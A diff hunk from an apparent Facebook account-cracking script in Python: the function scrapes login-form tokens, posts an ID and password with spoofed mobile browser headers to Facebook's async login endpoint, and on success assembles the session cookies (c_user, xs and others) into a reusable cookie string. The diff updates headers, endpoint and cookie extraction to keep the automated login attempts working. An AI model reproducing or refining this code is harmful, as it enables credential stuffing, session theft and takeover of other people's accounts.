@@ -1012,35 +1012,36 @@ def m2(idf,pwv):
    session = requests.Session()
    pro = random.choice(ugen)
    free_fb = session.get(f'https://m.facebook.com/?locale2=en_GB').text
-   log_data ={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":idf,"pass":ps,"login":"Log In"}
-   header_freefb ={'Host': 'm.facebook.com',
-   'Connection': 'keep-alive',
-   'Content-Length': '2059',
-   'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-   'sec-ch-ua-model': '"SM-S928B"',
-   'sec-ch-ua-mobile': '?1',
-   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
-   'viewport-width': '400',
-   'Content-Type': 'application/x-www-form-urlencoded',
-   'X-FB-LSD': 'AVovWh_3iKg',
-   'sec-ch-ua-platform-version': '"14.0.0"',
-   'X-ASBD-ID': '129477',
-   'dpr': '1.8',
-   'sec-ch-ua-full-version-list': '"Google Chrome";v="105.0.5195.136", "Not)A;Brand";v="8.0.0.0", "Chromium";v="105.0.5195.136"',
-   'sec-ch-prefers-color-scheme': 'dark',
-   'sec-ch-ua-platform': '"Android"',
-   'Accept': '*/*',
-   'Origin': 'https://m.facebook.com',
-   'Sec-Fetch-Site': 'same-origin',
-   'Sec-Fetch-Mode': 'cors',
-   'Sec-Fetch-Dest': 'empty',
-   'Referer': 'https://m.facebook.com/',
+   log_data ={
+   "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+   "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+   "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+   "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+   "try_number":"0",
+   "unrecognized_tries":"0",
+   "email":idf,
+   "pass":ps,
+   "login":"Log In"}
+   header_freefb ={
+   'User-Agent': 'Mozilla/5.0 (Linux; Android 14; 23076PC4BI Build/UKQ1.230917.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.23 Mobile Safari/537.36 GoogleApp/15.26.34.28.arm64',
+   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+   'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
-   'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',} #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
-   lo = session.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=log_data,headers=header_freefb).text
+   'Connection': 'keep-alive',
+   'Upgrade-Insecure-Requests': '1',
+   'Sec-Fetch-Site': 'same-origin',
+   'Sec-Fetch-Mode': 'navigate',
+   'Sec-Fetch-User': '?1',
+   'Sec-Fetch-Dest': 'document',
+   'Cache-Control': 'max-age=0',
+   'Referer': 'https://m.facebook.com/',
+   'DNT': '1',
+   'Pragma': 'no-cache',
+   'TE': 'Trailers', } #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
+   lo = session.post("https://www.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
-    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+    coki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
     user = re.findall('c_user=(.*);xs', coki)[0]
     url = f'https://graph.facebook.com/{user}/picture?type=normal'
     reqx = requests.get(url).text
